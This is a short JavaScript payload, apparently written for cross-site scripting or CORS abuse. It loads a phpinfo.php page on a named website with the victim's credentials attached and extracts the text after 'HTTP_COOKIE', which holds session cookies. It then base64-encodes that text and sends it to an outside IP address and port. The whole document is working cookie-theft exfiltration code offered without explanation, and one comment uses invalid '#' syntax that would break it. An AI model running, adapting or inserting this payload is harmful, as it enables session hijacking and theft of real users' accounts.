var req = new XMLHttpRequest();
req.onload = reqListener;
var url = 'http://christian.marcq.free.fr/php/phpinfo.php';
req.withCredentials = true; // send cookie header
req.open('GET', url, false);
req.send();

function reqListener() {
var req2 = new XMLHttpRequest();
const sess = this.responseText.substring(this.responseText.indexOf('HTTP_COOKIE') + 1 ); # Thats ugly, improve it :)
req2.open('GET', 'http://84.247.183.115:1177/?data=' + btoa(sess), false);
req2.send()
};
